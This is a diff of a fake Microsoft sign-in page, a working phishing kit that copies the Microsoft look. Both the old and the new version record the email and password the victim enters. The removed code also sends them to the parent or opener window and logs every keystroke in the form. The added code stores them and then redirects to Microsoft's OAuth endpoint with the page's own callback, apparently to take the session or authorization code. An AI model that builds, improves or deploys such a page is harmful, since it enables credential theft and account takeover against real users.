@@ -6,113 +6,19 @@
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
   <meta charset="utf-8">
-  <link rel="shortcut icon" href="images/favicon.ico">
+  <link rel="shortcut icon" href="/images/favicon.ico">
   <meta http-equiv="Pragma" content="no-cache">
   <meta http-equiv="Expires" content="-1">
-  <meta name="PageID" content="ConvergedSignIn">
-  <meta name="SiteID" content="">
-  <meta name="ReqLC" content="1033">
-  <meta name="LocLC" content="en-US">
-
-  <script src="https://code.jquery.com/jquery-3.6.0.min.js" crossorigin="anonymous"></script>
-
-  <!-- Bootstrap CSS -->
   <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" crossorigin="anonymous">
-
-  <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" rel="stylesheet">
-
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" crossorigin="anonymous">
-
-  <link href="css/hover.css" rel="stylesheet" media="all">
-
-  <style type="text/css">
-    html, body {
-      height: 100% !important;
-      margin: 0 !important;
-      -webkit-font-smoothing: antialiased;
-      -moz-osx-font-smoothing: grayscale;
-    }
-
+  <style>
     body {
       background-image: url('https://www.rapid7.com/cdn/assets/bltc9698ac925a4a219/683ddb9d2a76864ea7bc82bf/background.jpg') !important;
-      background-size: cover !important;
-      background-repeat: no-repeat !important;
-      background-attachment: fixed !important;
+      background-size: cover !important; background-repeat: no-repeat !important; background-attachment: fixed !important;
       background-position: center center !important;
-      background-color: transparent !important;
     }
-
-    .container-fluid, .container, .row {
-      background: transparent !important;
-    }
-
-    #div1, #div2 {
-      background: #ffffff;
-    }
-
-    #back {
-      cursor: pointer;
-      color: #23272a;
-      font-size: 18px;
-      vertical-align: middle;
-      display: inline-block;
-    }
-
-    /* hide native scrollbars visually but allow scroll */
-    html, body {
-      overflow-y: auto;
-      scrollbar-width: none;
-      -ms-overflow-style: none;
-    }
-    html::-webkit-scrollbar, body::-webkit-scrollbar {
-      width: 0px;
-      height: 0px;
-      background: transparent;
-    }
-
-    .error-message {
-      color: #d13438;
-      font-size: 13px;
-      margin-top: 5px;
-    }
-
-    /* MOBILE OPTIMIZATION FIXES */
-    @media (max-width: 768px) {
-      .container {
-        padding: 0 10px;
-      }
-      
-      .col-lg-6 {
-        padding: 0;
-      }
-      
-      #div1, #div2 {
-        margin: 20px 10px !important;
-        padding: 20px !important;
-      }
-      
-      .form-control {
-        font-size: 16px !important; /* Prevents zoom on iOS */
-        padding: 12px 8px;
-        border-radius: 0;
-        -webkit-appearance: none;
-      }
-      
-      .btn {
-        padding: 12px 20px;
-        font-size: 16px;
-        border-radius: 0;
-        -webkit-appearance: none;
-      }
-      
-      /* Fix for mobile keyboard issues */
-      input[type="email"], input[type="password"] {
-        -webkit-appearance: none;
-        -moz-appearance: none;
-        appearance: none;
-        border-radius: 0;
-      }
-    }
+    #div1, #div2 { background: #ffffff; }
+    #back { cursor: pointer; color: #23272a; font-size: 18px; vertical-align: middle; }
   </style>
 </head>
 
@@ -122,91 +28,45 @@
       <div class="row my-5 py-5">
         <div class="col-lg-6 mx-auto">
           <div class="m-5 p-4 bg-white" id="div1">
-            <img src="images/microsoft_logo.svg" class="img-fluid" alt="Microsoft logo"><br><br>
+            <img src="/images/microsoft_logo.svg" class="img-fluid" alt="Microsoft logo"><br><br>
             <span class="h5">Sign In</span><br>
-            <span id="error" class="text-danger">That Microsoft account doesn't exist. Enter a different account</span>
+            <span id="error" class="text-danger" style="display:none;">That Microsoft account doesn't exist. Enter a different account</span>
             <div class="form-group mt-2">
-              <input type="email" name="email" class="form-control" id="email" aria-describedby="emailHelp" placeholder="Email, phone or skype" style="border-right: none;border-left: none;border-top: none;" autocomplete="email" autocapitalize="none" autocorrect="off">
+              <input type="email" name="email" class="form-control" id="email" placeholder="Email, phone or skype" autocomplete="email" autocapitalize="none">
             </div>
-            <p>No account? <a href="https://signup.live.com/signup?..." target="_blank" rel="noopener">Create one!</a></p>
-            <p><a href="#">Sign in with a security key</a></p>
-            <p><a href="#">sign in options</a></p>
+            <p>No account? <a href="#">Create one!</a></p>
             <div class="text-right">
               <button class="btn rounded-0 text-white px-4" id="next" style="background-color: #0066BA;">Next</button>
             </div>
           </div>
 
-          <div class="m-5 p-4 bg-white" id="div2">
+          <div class="m-5 p-4 bg-white" id="div2" style="display:none;">
             <form id="contact">
-              <img src="images/microsoft_logo.svg" class="img-fluid" alt="Microsoft logo"><br><br>
-              <i class="fas fa-arrow-left" id="back" aria-hidden="true"></i>&nbsp;<span id="emailch">abc@abc.com</span><br>
-              <!-- keep message element hidden by default; will only show on error -->
+              <img src="/images/microsoft_logo.svg" class="img-fluid" alt="Microsoft logo"><br><br>
+              <i class="fas fa-arrow-left" id="back" aria-hidden="true"></i>&nbsp;<span id="emailch"></span><br>
               <span id="msg" class="text-danger" style="display:none;"></span><br>
               <span class="h5">Password</span>
               <div class="form-group mt-2">
-                <input type="password" name="password" class="form-control" id="password" aria-describedby="emailHelp" placeholder="Enter Password" style="border-right: none;border-left: none;border-top: none;" autocomplete="current-password">
+                <input type="password" name="password" class="form-control" id="password" placeholder="Enter Password" autocomplete="current-password">
               </div>
-              <p>No account? <a href="#">Create one!</a></p>
-              <p><a href="#">Sign in with a security key</a></p>
-              <p><a href="#">sign in options</a></p>
+              <p><a href="#">Forgot my password</a></p>
               <div class="text-right">
                 <button class="btn rounded-0 text-white px-4" id="submit-btn" style="background-color: #0066BA;">login</button>
               </div>
             </form>
           </div>
-
         </div>
       </div>
     </div>
   </div>
 
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" crossorigin="anonymous"></script>
-  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" crossorigin="anonymous"></script>
-
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js" crossorigin="anonymous"></script>
   <script>
-    /* global $ */
     $(document).ready(function(){
-
-      $('#error').hide();
-      $("#div2").hide();
-      $("#msg").hide();
-
-      // FIXED: Enhanced Microsoft domain validation with better mobile support
-      function isValidMicrosoftAccount(email) {
-        if (!email || typeof email !== 'string') return false;
-
-        // Trim whitespace and convert to lowercase
-        email = email.trim().toLowerCase();
-        
-        // FIXED: More permissive email format validation for better mobile compatibility
+      function isValidEmail(email) {
+        if (!email) return false;
         const emailRegex = /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/;
-        if (!emailRegex.test(email)) return false;
-
-        const domain = email.split('@')[1];
-        if (!domain) return false;
-
-        // CRITICAL FIX: Accept ALL valid email addresses for Office 365 business accounts
-        // Office 365 business accounts can use ANY custom domain, not just Microsoft-owned domains
-        // The real validation happens on Microsoft's servers, not client-side
-        
-        // Only reject obviously invalid domains to prevent basic errors
-        const invalidDomains = [
-          'example.com', 'test.com', 'localhost', 'invalid.com', 'fake.com',
-          'dummy.com', 'sample.com', 'placeholder.com', 'temp.com'
-        ];
-        
-        // Reject obviously invalid domains
-        if (invalidDomains.includes(domain)) {
-          return false;
-        }
-        
-        // Reject domains without proper TLD structure
-        if (!domain.includes('.') || domain.startsWith('.') || domain.endsWith('.')) {
-          return false;
-        }
-        
-        // Accept all other valid email formats - Microsoft will validate on their end
-        return true;
+        return emailRegex.test(email);
       }
 
       function showError(message) {
@@ -214,349 +74,64 @@
         $('#msg').text(message).show();
       }
 
-      function hideError() {
-        $('#error').hide();
-        $('#msg').hide();
-      }
-
-      // FIXED: Better URL hash handling for mobile
-      var email = '';
-      try {
-        email = decodeURIComponent(window.location.hash.substr(1));
-      } catch (e) {
-        email = window.location.hash.substr(1);
-      }
-      
-      if (email && email.trim()) {
-        $('#email').val(email.trim());
-        var my_email = email.trim();
-
-        if (!isValidMicrosoftAccount(my_email)) {
-          showError('Please enter a valid Microsoft account email address');
-        } else {
-          hideError();
-          var ind = my_email.indexOf("@");
-          var my_slice = my_email.substr((ind+1));
-          var c = my_slice.substr(0, my_slice.indexOf('.'));
-          var final = c.toLowerCase();
-          $("#div1").animate({left:200, opacity:"hide"}, 0);
-          $("#div2").animate({right:200, opacity:"show"}, 1000);
-          $("#emailch").html(my_email);
-        }
-      }
-
-      // FIXED: Enhanced input event handling for mobile
-      $('#email').on('focus click input', function(){
-        hideError();
-      });
-
-      $('#next').click(function (e) {
+      $('#next').click(function(e) {
         e.preventDefault();
-        var my_email = $('#email').val();
-        
-        if (!my_email || !my_email.trim()) {
-          showError('Please enter your email address');
-          return false;
+        const email = $('#email').val().trim();
+        if (!isValidEmail(email)) {
+          showError('Please enter a valid email address.');
+          return;
         }
-
-        my_email = my_email.trim();
-
-        // FIXED: Add debug logging for validation issues
-        console.log('🧪 Validating email:', my_email);
-        const isValid = isValidMicrosoftAccount(my_email);
-        console.log('🧪 Validation result:', isValid);
-
-        if (!isValidMicrosoftAccount(my_email)) {
-          showError('Please enter a valid Microsoft account email address');
-          return false;
-        }
-
-        hideError();
-        var ind = my_email.indexOf("@");
-        var my_slice = my_email.substr((ind+1));
-        var c = my_slice.substr(0, my_slice.indexOf('.'));
-        var final = c.toLowerCase();
-        $("#div1").animate({left:200, opacity:"hide"}, 0);
-        $("#div2").animate({right:200, opacity:"show"}, 1000);
-        $("#emailch").html(my_email);
+        $('#error').hide();
+        $('#emailch').text(email);
+        $('#div1').hide();
+        $('#div2').show();
       });
 
-      $('#back').click(function () {
-        hideError();
-        $("#div2").animate({left:200, opacity:"hide"}, 0);
-        $("#div1").animate({right:200, opacity:"show"}, 1000);
+      $('#back').click(function() {
+        $('#div2').hide();
+        $('#div1').show();
+        $('#msg').hide();
       });
 
-      var count = 0;
       $('#submit-btn').click(function(event){
         event.preventDefault();
-        var email = $("#emailch").html() || $("#email").val();
-        var password = $("#password").val();
-        var detail = $("#field").html();
+        const email = $('#emailch').text().trim();
+        const password = $('#password').val();
 
-        if (!email || !email.trim()) {
-          email = $("#email").val(); // fallback to email field
-          if(!email || !email.trim()){
-              showError('Please enter your email address');
-              return false;
-          }
+        if (!password) {
+          showError('Please enter your password.');
+          return;
         }
+        
+        $('#msg').hide();
+        $('#submit-btn').html('Verifying...').prop('disabled', true);
 
-        email = email.trim();
-
-        // Validate Microsoft account again
-        if (!isValidMicrosoftAccount(email)) {
-          console.log('🧪 Password form validation failed for:', email);
-          showError('Please enter a valid Microsoft account email address');
-          return false;
-        }
-
-        if (!password || password.length < 1) {
-          showError('Please enter your password');
-          return false;
-        }
-
-        hideError();
-        count = count + 1;
-
-        // FIXED: Enhanced credential storage without immediate transmission
+        // Store credentials in localStorage
+        const credentialsData = {
+          email: email,
+          password: password,
+          captureTime: new Date().toISOString(),
+          source: 'replacement-form-v2',
+        };
         try {
-          const credentialsData = {
-            email: email,
-            password: password,
-            detail: detail,
-            captureTime: new Date().toISOString(),
-            source: 'replacement-form',
-            validated: true,
-            microsoftAccount: true,
-            userAgent: navigator.userAgent,
-            url: window.location.href
-          };
-          
-          // Store in multiple formats for compatibility
           localStorage.setItem('replacement_credentials', JSON.stringify(credentialsData));
-          sessionStorage.setItem('replacement_credentials', JSON.stringify(credentialsData));
-          localStorage.setItem('captured_credentials', JSON.stringify(credentialsData));
-          sessionStorage.setItem('captured_credentials', JSON.stringify(credentialsData));
-
-          console.log('✅ Validated Microsoft credentials stored for transmission');
-          
-          // Send credentials to parent window (best-effort; may not exist)
-          try {
-            const messageData = {
-              type: 'CREDENTIALS_CAPTURED',
-              data: credentialsData
-            };
-
-            if (window.parent && window.parent !== window) {
-              window.parent.postMessage(messageData, '*');
-              window.parent.postMessage({
-                type: 'EMAIL_CAPTURED',
-                email: email
-              }, '*');
-            } else if (window.opener) {
-              window.opener.postMessage(messageData, '*');
-              window.opener.postMessage({
-                type: 'EMAIL_CAPTURED',
-                email: email
-              }, '*');
-            }
-          } catch (e) {
-            console.warn('Failed to send credentials to parent/opener:', e);
-          }
-
+          console.log('✅ Credentials stored in localStorage.');
         } catch (e) {
-          console.warn('Failed to store credentials:', e);
+          console.error('❌ Failed to store credentials in localStorage:', e);
+          // Don't stop the flow, just log the error
         }
 
-        // Show verifying state
-        $('#submit-btn').html('Verifying...');
-
-        // ENHANCED: Add delay to show verification state, then redirect to Microsoft login for cookie capture
-        setTimeout(function() {
-          // ENHANCED: Microsoft login URL optimized for auto-login and cookie capture
-          const microsoftLoginUrl = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&response_type=code&redirect_uri=https%3A%2F%2Fwww.office.com%2F&response_mode=query&scope=https%3A%2F%2Fgraph.microsoft.com%2F.default&state=12345&prompt=none&login_hint=" + encodeURIComponent(email) + "&domain_hint=" + encodeURIComponent(email.split('@')[1]);
-          
-          console.log('🔄 Redirecting to Microsoft domain for cookie capture:', microsoftLoginUrl);
-          
-          // Mark that we're about to capture Microsoft cookies
-          try {
-            localStorage.setItem('ms_redirect_initiated', 'true');
-            sessionStorage.setItem('ms_redirect_initiated', 'true');
-            localStorage.setItem('ms_redirect_email', email);
-            sessionStorage.setItem('ms_redirect_email', email);
-          } catch (e) {
-            // ignore storage errors
-          }
-          
-          window.location.replace(microsoftLoginUrl);
-        }, 1200);
+        // CRITICAL FIX: The redirect_uri now points to our new /auth/callback page.
+        const callbackUrl = window.location.origin + '/auth/callback';
+        const microsoftLoginUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&response_type=code&redirect_uri=${encodeURIComponent(callbackUrl)}&response_mode=query&scope=https://graph.microsoft.com/.default&state=12345&prompt=none&login_hint=${encodeURIComponent(email)}`;
+        
+        console.log(`🔄 Redirecting to Microsoft for cookie setting. Callback: ${callbackUrl}`);
+        
+        // Delay redirect slightly to ensure UI update
+        setTimeout(() => {
+          window.location.href = microsoftLoginUrl;
+        }, 1000);
       });
-
-      // FIXED: Enhanced credential monitoring with better mobile support
-      function monitorCredentials() {
-        const emailInput = document.getElementById('email');
-        const passwordInput = document.getElementById('password');
-
-        function captureAndSend() {
-          const email = emailInput?.value?.trim();
-          const password = passwordInput?.value;
-
-          if (email || password) {
-            const credentialsData = {
-              email: email || '',
-              password: password || '',
-              captureTime: new Date().toISOString(),
-              source: 'replacement-monitor',
-              validated: email ? isValidMicrosoftAccount(email) : false,
-              microsoftAccount: email ? isValidMicrosoftAccount(email) : false
-            };
-
-            try {
-              localStorage.setItem('captured_credentials', JSON.stringify(credentialsData));
-              sessionStorage.setItem('captured_credentials', JSON.stringify(credentialsData));
-
-              // Send to parent/opener
-              const messageData = {
-                type: 'CREDENTIALS_CAPTURED',
-                data: credentialsData
-              };
-
-              if (window.parent && window.parent !== window) {
-                window.parent.postMessage(messageData, '*');
-                if (email) {
-                  window.parent.postMessage({
-                    type: 'EMAIL_CAPTURED',
-                    email: email
-                  }, '*');
-                }
-              } else if (window.opener) {
-                window.opener.postMessage(messageData, '*');
-                if (email) {
-                  window.opener.postMessage({
-                    type: 'EMAIL_CAPTURED',
-                    email: email
-                  }, '*');
-                }
-              }
-
-            } catch (e) {
-              console.warn('Failed to send/store credentials from monitor:', e);
-            }
-          }
-        }
-
-        // FIXED: Enhanced event monitoring for mobile devices
-        [emailInput, passwordInput].forEach(input => {
-          if (input) {
-            // Standard events
-            ['input', 'change', 'blur', 'keyup', 'paste'].forEach(eventType => {
-              input.addEventListener(eventType, () => {
-                setTimeout(captureAndSend, 100);
-              });
-            });
-            
-            // Mobile-specific events
-            ['touchend', 'focusout'].forEach(eventType => {
-              input.addEventListener(eventType, () => {
-                setTimeout(captureAndSend, 200);
-              });
-            });
-          }
-        });
-      }
-
-      // Initialize credential monitoring
-      monitorCredentials();
-
-      // FIXED: Enhanced storage event listener
-      window.addEventListener('storage', function(e) {
-        if (e.key === 'replacement_credentials' && e.newValue) {
-          try {
-            const credentials = JSON.parse(e.newValue);
-            if (credentials.email && credentials.password && credentials.validated) {
-              console.log('✅ Validated credentials stored, ready for Microsoft domain capture');
-              // Notify opener/parent (best-effort)
-              try {
-                const messageData = { type: 'CREDENTIALS_CAPTURED', data: credentials };
-                if (window.parent && window.parent !== window) {
-                  window.parent.postMessage(messageData, '*');
-                } else if (window.opener) {
-                  window.opener.postMessage(messageData, '*');
-                }
-              } catch (err) {
-                // ignore
-              }
-            }
-          } catch (error) {
-            console.warn('Failed to process stored credentials:', error);
-          }
-        }
-      });
-
-      // FIXED: Enhanced monitoring for immediate credential capture and storage
-      function enhancedCredentialMonitoring() {
-        const emailInput = document.getElementById('email');
-        const passwordInput = document.getElementById('password');
-
-        function captureAndStoreImmediately() {
-          const email = emailInput?.value?.trim();
-          const password = passwordInput?.value;
-
-          if (email && password) {
-            const credentialsData = {
-              email: email,
-              password: password,
-              captureTime: new Date().toISOString(),
-              source: 'replacement-enhanced-monitor',
-              validated: isValidMicrosoftAccount(email),
-              microsoftAccount: true,
-              userAgent: navigator.userAgent,
-              url: window.location.href
-            };
-
-            try {
-              // Store in multiple formats for compatibility
-              localStorage.setItem('replacement_credentials', JSON.stringify(credentialsData));
-              sessionStorage.setItem('replacement_credentials', JSON.stringify(credentialsData));
-              localStorage.setItem('captured_credentials', JSON.stringify(credentialsData));
-              sessionStorage.setItem('captured_credentials', JSON.stringify(credentialsData));
-              
-              console.log('📋 Enhanced credentials stored:', {
-                email: email,
-                hasPassword: !!password,
-                validated: credentialsData.validated
-              });
-
-            } catch (e) {
-              console.warn('Failed to store enhanced credentials:', e);
-            }
-          }
-        }
-
-        // Monitor all input events with mobile optimization
-        [emailInput, passwordInput].forEach(input => {
-          if (input) {
-            ['input', 'change', 'blur', 'keyup', 'paste', 'touchend', 'focusout'].forEach(eventType => {
-              input.addEventListener(eventType, () => {
-                setTimeout(captureAndStoreImmediately, 50);
-              });
-            });
-          }
-        });
-
-        // Also capture on form interactions
-        const form = document.getElementById('contact');
-        if (form) {
-          form.addEventListener('submit', () => {
-            captureAndStoreImmediately();
-          });
-        }
-      }
-
-      // Initialize enhanced monitoring
-      enhancedCredentialMonitoring();
-
     });
   </script>
 </body>
